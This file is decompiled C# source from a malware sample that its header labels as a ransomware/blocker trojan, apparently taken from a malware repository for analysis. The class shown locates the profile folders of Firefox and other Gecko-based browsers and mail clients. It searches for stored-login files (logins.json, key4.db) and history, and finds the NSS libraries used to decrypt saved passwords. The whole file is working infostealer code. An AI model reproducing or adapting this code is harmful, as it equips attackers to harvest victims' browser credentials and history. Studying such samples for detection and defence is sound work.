// Decompiled with JetBrains decompiler
// Type: pazuzu.FireFox.Profile
// Assembly: Private, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 345B90E2-2B0E-4FAF-8906-CB0787A05498
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5dc3085c70289a9a4a0699d883af744e8777d3b9bbe07de15e4087bcce71d3d9.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace pazuzu.FireFox
{
  internal class Profile
  {
    public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private static string[] GeckoBrowsersList = new string[8]
    {
      "Mozilla\\Firefox",
      "Waterfox",
      "K-Meleon",
      "Thunderbird",
      "Comodo\\IceDragon",
      "8pecxstudios\\Cyberfox",
      "NETGATE Technologies\\BlackHaw",
      "Moonchild Productions\\Pale Moon"
    };

    private static string[] Concat(string[] x, string[] y)
    {
      if (x == null)
        throw new ArgumentNullException(nameof (x));
      if (y == null)
        throw new ArgumentNullException(nameof (y));
      int length = x.Length;
      Array.Resize<string>(ref x, x.Length + y.Length);
      Array.Copy((Array) y, 0, (Array) x, length, y.Length);
      return x;
    }

    private static string[] ProgramFilesChildren()
    {
      string[] x = Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles"));
      if (8 == IntPtr.Size || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
        x = Profile.Concat(x, Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles(x86)")));
      return x;
    }

    public static string GetProfile(string path)
    {
      try
      {
        string path1 = Path.Combine(path, "Profiles");
        if (Directory.Exists(path1))
        {
          foreach (string directory in Directory.GetDirectories(path1))
          {
            if (File.Exists(directory + "\\logins.json") || File.Exists(directory + "\\key4.db") || File.Exists(directory + "\\places.sqlite"))
              return directory;
          }
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine("\n" + ex?.ToString());
      }
      return (string) null;
    }

    public static string GetMozillaPath()
    {
      foreach (string programFilesChild in Profile.ProgramFilesChildren())
      {
        if (File.Exists(programFilesChild + "\\nss3.dll") && File.Exists(programFilesChild + "\\mozglue.dll"))
          return programFilesChild;
      }
      return (string) null;
    }

    public static string[] GetMozillaBrowsers()
    {
      List<string> stringList = new List<string>();
      foreach (string geckoBrowsers in Profile.GeckoBrowsersList)
      {
        string path = Path.Combine(Profile.Appdata, geckoBrowsers);
        if (Directory.Exists(path))
          stringList.Add(path);
      }
      return stringList.ToArray();
    }
  }
}
